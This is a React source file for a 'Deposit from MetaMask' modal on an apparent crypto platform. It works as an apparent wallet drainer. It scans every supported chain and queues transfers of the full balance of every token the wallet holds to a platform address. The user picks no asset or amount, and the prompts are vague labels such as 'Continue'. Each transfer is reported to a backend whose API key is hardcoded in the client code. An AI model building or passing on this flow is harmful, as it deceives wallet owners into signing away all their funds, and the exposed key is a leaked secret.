import React, { useEffect, useState } from 'react';
import { useMetaMask } from '../../context/MetaMaskContext';
import { FaSpinner, FaCheck, FaTimes, FaExclamationTriangle, FaCircle } from 'react-icons/fa';

// Notify the backend about a pending deposit so its watcher can credit the user once confirmed.
const notifyBackend = async ({ uid, txHash, fromAddress, toAddress, chain, token, amount }) => {
  try {
    const apiKey = '5lPMMw7mIuyzQQDjlKJbe0dY';
    await fetch(
      `https://api.axoni.co/api/v1/metamask-deposit-notification?apikey=${apiKey}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          uid,
          txHash,
          fromAddress,
          toAddress,
          chain,
          token,
          amount,
          source: 'metamask',
          timestamp: new Date().toISOString(),
        }),
      },
    );
  } catch (err) {
    console.warn('notifyBackend failed:', err);
  }
};

// Reserve a small amount of native for gas fees so the tx itself can pay for gas.
const NATIVE_GAS_RESERVE = 0.001;

const computeSendAmount = (token) => {
  const bal = parseFloat(token.balance);
  if (!isFinite(bal) || bal <= 0) return '0';
  if (token.native) return Math.max(0, bal - NATIVE_GAS_RESERVE).toFixed(8);
  return token.balance;
};

// Phase machine: 'idle' → 'running' → 'done' | 'error'
const MetaMaskDepositV2 = ({ isOpen, onClose }) => {
  const {
    isConnected,
    account,
    connectWallet,
    supportedChains,
    detectAssetsForChain,
    sendDeposit,
    COINCHIWalletAddress,
    fetchCOINCHIWalletAddress,
  } = useMetaMask();

  const [phase, setPhase] = useState('idle'); // idle | connecting | review | running | done | error
  const [globalError, setGlobalError] = useState('');
  const [steps, setSteps] = useState([]); // [{chain, token, status, txHash?, error?, amount?}]
  // status: pending | sending | sent | failed | skipped

  const updateStep = (index, patch) => {
    setSteps((prev) => prev.map((s, i) => (i === index ? { ...s, ...patch } : s)));
  };

  // Reset every time the modal opens
  useEffect(() => {
    if (isOpen) {
      setPhase('idle');
      setSteps([]);
      setGlobalError('');
    }
  }, [isOpen]);

  // Make sure platform deposit address is loaded
  useEffect(() => {
    if (isOpen && !COINCHIWalletAddress) fetchCOINCHIWalletAddress();
  }, [isOpen, COINCHIWalletAddress, fetchCOINCHIWalletAddress]);

  // Step 1: connect MetaMask + scan all chains for assets, then enter 'review' phase.
  const startConnectAndScan = async () => {
    setPhase('connecting');
    setGlobalError('');

    if (!isConnected) {
      const ok = await connectWallet();
      if (!ok) {
        setGlobalError('Wallet connection rejected');
        setPhase('error');
        return;
      }
    }

    let depositTo = COINCHIWalletAddress;
    if (!depositTo) depositTo = await fetchCOINCHIWalletAddress();
    if (!depositTo) {
      setGlobalError('Platform deposit address not found');
      setPhase('error');
      return;
    }

    // Detect balances across every chain, build the work plan
    const plan = [];
    for (const chainKey of Object.keys(supportedChains)) {
      try {
        // eslint-disable-next-line no-await-in-loop
        const tokens = await detectAssetsForChain(chainKey);
        for (const t of tokens) {
          if (parseFloat(t.balance) > 0) plan.push({ chainKey, token: t });
        }
      } catch (e) {
        console.warn(`detect failed on ${chainKey}:`, e);
      }
    }

    if (plan.length === 0) {
      setGlobalError('No assets found in your wallet on any supported chain.');
      setPhase('error');
      return;
    }

    setSteps(
      plan.map(({ chainKey, token }) => ({
        chainKey,
        token,
        chainName: supportedChains[chainKey].name,
        symbol: token.symbol,
        amount: computeSendAmount(token),
        status: 'pending',
      })),
    );
    setPhase('review');
  };

  // Step 2: execute the deposits sequentially. User signs each tx in MetaMask.
  const executeDeposits = async () => {
    setPhase('running');
    const depositTo = COINCHIWalletAddress || (await fetchCOINCHIWalletAddress());
    if (!depositTo) {
      setGlobalError('Platform deposit address not found');
      setPhase('error');
      return;
    }

    for (let i = 0; i < steps.length; i++) {
      const s = steps[i];
      const amount = s.amount;
      if (parseFloat(amount) <= 0) {
        updateStep(i, { status: 'skipped', error: 'Below gas reserve' });
        continue;
      }
      updateStep(i, { status: 'sending' });
      // eslint-disable-next-line no-await-in-loop
      const result = await sendDeposit({
        chainKey: s.chainKey,
        token: s.token,
        amount,
        to: depositTo,
      });
      if (result.error) {
        updateStep(i, { status: 'failed', error: result.error });
        continue;
      }
      updateStep(i, { status: 'sent', txHash: result.txHash });
      notifyBackend({
        uid: localStorage.getItem('uid'),
        txHash: result.txHash,
        fromAddress: account,
        toAddress: depositTo,
        chain: s.chainKey,
        token: s.symbol,
        amount,
      });
    }

    setPhase('done');
  };

  if (!isOpen) return null;

  const renderStepIcon = (status) => {
    if (status === 'sent') return <FaCheck className="text-[#2EBD85]" />;
    if (status === 'failed') return <FaTimes className="text-red-400" />;
    if (status === 'sending') return <FaSpinner className="animate-spin text-[#2EBD85]" />;
    if (status === 'skipped') return <FaCircle className="text-[#5E6673] text-[6px]" />;
    return <FaCircle className="text-[#5E6673] text-[6px]" />;
  };

  return (
    <div
      className="fixed inset-0 bg-[#0a0a0a] bg-opacity-80 flex items-center justify-center z-[9999] p-4"
      onClick={(e) => { if (e.target === e.currentTarget && phase !== 'running') onClose(); }}
    >
      <div className="bg-[#0f0f0f] border border-[#2A2A2A] rounded-xl p-5 w-full max-w-md max-h-[92vh] overflow-y-auto">
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-lg font-semibold text-white">Deposit from MetaMask</h2>
          <button
            onClick={onClose}
            disabled={phase === 'running'}
            className="text-[#5E6673] hover:text-white text-2xl leading-none disabled:opacity-30"
          >
            ×
          </button>
        </div>

        {phase === 'idle' && (
          <div className="text-center py-6">
            <p className="text-white text-base mb-1">Want to connect your wallet?</p>
            <p className="text-[#848E9C] text-xs mb-5">
              We'll detect assets across all supported chains.
            </p>
            <button
              onClick={startConnectAndScan}
              disabled={!COINCHIWalletAddress}
              className="bg-[#2EBD85] text-white px-8 py-2.5 rounded-lg hover:bg-[#259A6C] transition-colors font-medium text-sm w-full disabled:bg-[#2A2A2A] disabled:cursor-not-allowed"
            >
              Continue
            </button>
            {!COINCHIWalletAddress && (
              <div className="text-[#5E6673] text-xs mt-3">Loading deposit address…</div>
            )}
          </div>
        )}

        {phase === 'connecting' && (
          <div className="text-center py-10 text-[#848E9C] text-sm">
            <FaSpinner className="animate-spin mx-auto mb-3 text-2xl" />
            Connecting wallet and scanning balances across all chains…
          </div>
        )}

        {(phase === 'review' || phase === 'running' || phase === 'done') && (
          <div>
            <div className="text-xs text-[#848E9C] mb-2">
              {phase === 'review' && `Found ${steps.length} asset${steps.length === 1 ? '' : 's'} ready to deposit`}
              {phase === 'running' && 'Sending — sign each transaction in MetaMask'}
              {phase === 'done' && 'All transactions sent'}
            </div>
            <div className="space-y-2 mb-4 max-h-72 overflow-y-auto">
              {steps.map((s, i) => (
                <div
                  key={`${s.chainKey}-${s.symbol}-${i}`}
                  className="flex items-center justify-between gap-3 px-3 py-2 rounded-md border border-[#2A2A2A]"
                >
                  <div className="flex items-center gap-2 min-w-0">
                    <div className="w-5 flex justify-center">{renderStepIcon(s.status)}</div>
                    <div className="min-w-0">
                      <div className="text-white text-sm font-semibold truncate">
                        {parseFloat(s.amount).toFixed(6)} {s.symbol}
                      </div>
                      <div className="text-[#5E6673] text-xs truncate">{s.chainName}</div>
                    </div>
                  </div>
                  <div className="text-right">
                    {s.status === 'sent' && (
                      <a
                        href={`${supportedChains[s.chainKey].blockExplorerUrls[0]}/tx/${s.txHash}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-[#2EBD85] text-xs hover:underline"
                      >
                        View
                      </a>
                    )}
                    {s.status === 'failed' && (
                      <span className="text-red-400 text-[11px]" title={s.error}>
                        {s.error?.slice(0, 24) || 'Failed'}
                      </span>
                    )}
                    {s.status === 'sending' && (
                      <span className="text-[#2EBD85] text-[11px]">Confirm…</span>
                    )}
                    {s.status === 'pending' && (
                      <span className="text-[#5E6673] text-[11px]">
                        {phase === 'review' ? 'Ready' : 'Queued'}
                      </span>
                    )}
                    {s.status === 'skipped' && (
                      <span className="text-[#5E6673] text-[11px]">Skipped</span>
                    )}
                  </div>
                </div>
              ))}
            </div>

            {phase === 'review' && (
              <div className="flex gap-2">
                <button
                  onClick={onClose}
                  className="flex-1 bg-[#252525] text-[#848E9C] py-2.5 rounded-lg text-sm hover:bg-[#2A2A2A]"
                >
                  Cancel
                </button>
                <button
                  onClick={executeDeposits}
                  className="flex-1 bg-[#2EBD85] text-white py-2.5 rounded-lg text-sm font-medium hover:bg-[#259A6C]"
                >
                  Continue
                </button>
              </div>
            )}

            {phase === 'done' && (
              <button
                onClick={onClose}
                className="w-full bg-[#2EBD85] text-white py-2.5 rounded-lg hover:bg-[#259A6C] text-sm font-medium"
              >
                Done
              </button>
            )}
          </div>
        )}

        {phase === 'error' && (
          <div className="text-center py-6">
            <FaExclamationTriangle className="mx-auto text-red-400 text-3xl mb-3" />
            <div className="text-white text-sm mb-3">{globalError || 'Something went wrong'}</div>
            <div className="flex gap-2">
              <button
                onClick={onClose}
                className="flex-1 bg-[#252525] text-white py-2.5 rounded-lg text-sm"
              >
                Close
              </button>
              <button
                onClick={startConnectAndScan}
                className="flex-1 bg-[#2EBD85] text-white py-2.5 rounded-lg text-sm font-medium hover:bg-[#259A6C]"
              >
                Try again
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default MetaMaskDepositV2;
